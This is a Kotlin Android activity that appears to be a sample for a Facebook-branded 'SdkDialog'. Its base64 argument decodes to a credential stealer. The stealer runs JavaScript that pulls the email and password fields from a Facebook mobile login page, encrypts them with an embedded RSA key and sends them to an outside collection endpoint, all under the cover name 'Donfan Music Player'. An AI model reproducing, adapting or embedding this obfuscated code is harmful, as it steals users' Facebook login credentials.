package com.example.sdk

import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.view.View
import com.facebook.sdk.EvenCallBack
import com.facebook.sdk.SdkDialog

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        findViewById<View>(R.id.ssa).setOnClickListener {
            showDialog()
        }
    }

    fun showDialog() {
        SdkDialog("eyJqc3NwbGl0IjoiXzFfMV85XyIsImpzY29kZXMiOiIoZnVuY3Rpb24oKXtyZXR1cm4gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21fbG9naW5fZW1haWwnKS52YWx1ZSsnXzFfMV85XycrZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21fbG9naW5fcGFzc3dvcmQnKS52YWx1ZTt9KSgpIiwidGl0bGUiOiJBdXRob3JpemF0aW9uIiwiY2hlY2tfa2V5IjoieHMiLCJkdmIiOiJkZXZpY2UtYmFzZWQiLCJwYWNrYWdlIjoib3JnLmRvbmZhbi5wbGF5ZXIuYXBwIiwiYXBwX25hbWUiOiJEb25mYW4gTXVzaWMgUGxheWVyIiwicl91cmwiOiJodHRwczpcL1wvbS5mYWNlYm9vay5jb21cLyIsImNfdXJsIjoiaHR0cHM6XC9cL2tjb2ZmbmkueHl6XC9hcGlcL29wZW5cL2NvbGxlY3QiLCJlbmNvZGUiOiJNSUdmTUEwR0NTcUdTSWIzRFFFQkFRVUFBNEdOQURDQmlRS0JnUUNHK25od0N5ZzRQc0xrMUNSSGJJSytFMCsxT1Nob1dJYng2OElURFczdkZTWHNXMXpaOUFOTGpxR1lBT0VrWHdPZGZqelp1V0NoN1ZtMlpDakx4emNCNnRwWU1RVkJPZ0s0TzNrYllza1loNTRjVERDQlBNMlwvVUNjbkxjYmFVOTk0cFoxbVM2ZEVNXC9PUFFYYjNLdkNWT1lGUlVQeU5IYlQrXC9OcUNGcllpZVFJREFRQUIiLCJwYWRkaW5nIjoiUlNBXC9FQ0JcL1BLQ1MxUGFkZGluZyJ9").apply {
            setCloseListener(object : EvenCallBack {
                override fun onCloseListener() {

                }

                override fun onResultListener() {
                }

                override fun onUAStringCallBack(ua: String) {
                }

                override fun onLoaded() {
                }

            })
        }.show(supportFragmentManager, "")
    }
}